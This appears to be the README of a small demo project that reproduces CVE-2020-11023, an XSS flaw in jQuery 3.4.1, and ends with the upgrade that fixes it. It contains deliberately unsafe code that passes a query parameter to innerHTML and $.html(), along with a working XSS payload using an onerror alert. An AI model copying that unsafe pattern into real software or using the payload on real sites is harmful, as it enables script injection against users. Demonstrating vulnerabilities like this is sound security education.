# Jquery XSS - CVE-2020-11023

This is a demonstration of reproducing `CVE-2020-11023`. Source is mainly from this [blog post](https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html).

## Reproduce

Install npm dependencies with `npm install`, jQuery 3.4.1 is included as a dependency. Run the project with for example live server for vs code.

Open the site with the link [http://127.0.0.1:5500/index.html?link=%3Cbutton%3EMy%20pretty%20button%20%F0%9F%8C%B4%F0%9F%A5%A5%3C/button%3E](http://127.0.0.1:5500/index.html?link=%3Cbutton%3EMy%20pretty%20button%20%F0%9F%8C%B4%F0%9F%A5%A5%3C/button%3E).

Jquery will use the html function to update the div with the content of the `link` query parameter. The pure js version is demonstrated as well:

```js
$(function () {
  const unsafe = new URLSearchParams(location.search).get("link");
  document.getElementById("div-1").innerHTML = unsafe;
  $("#div-2").html(unsafe);
});
```

Now open the site again but with content in query that looks like this.

```html
<img alt="<x" title="/><img src=x onerror=alert(1)>" />
```

[http://127.0.0.1:5500/index.html?link=%3Cimg%20alt=%22%3Cx%22%20title=%22/%3E%3Cimg%20src=x%20onerror=alert(1)%3E%22%3E](<http://127.0.0.1:5500/index.html?link=%3Cimg%20alt=%22%3Cx%22%20title=%22/%3E%3Cimg%20src=x%20onerror=alert(1)%3E%22%3E>).

This is an image that contains a strange title, but the code is safe and will normaly not execute javascript. Inspecting the dom of div 1 it only contains `<img alt="<x" title="/><img src=x onerror=alert(1)>">` and no code is executed. However jQuery will parse the expression and return an unsafe version that executes javascript.

```html
<img src="x" onerror="alert(1)" />
```

## Fix the problem

Run `npm install jquery@3.5.0`.
